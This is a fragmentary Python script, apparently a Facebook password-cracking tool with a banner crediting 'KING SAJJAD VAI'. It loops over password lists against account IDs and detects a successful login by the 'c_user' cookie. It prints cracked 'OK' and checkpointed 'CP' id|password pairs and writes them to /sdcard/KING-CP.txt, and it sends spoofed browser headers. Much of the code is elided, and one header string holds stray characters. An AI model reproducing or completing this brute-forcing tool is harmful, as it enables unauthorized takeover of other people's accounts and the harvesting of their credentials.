...
\33[1;37m----------------------------------------------
→   Owner      :  KING SAJJAD VAI
→   Facebook   :  ALC SaJJad YT 
→   Github     :  SB-BILLAL 
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/KING.OFFICIAL.ACCOUNT');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mKING\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[KING-OK] '+ids+' | '+pas+'\033[1;32m')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[KING-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[KING-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/KING-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def fcrack(uid,pwx,tl):
    ...
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.এভঢ়থ0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
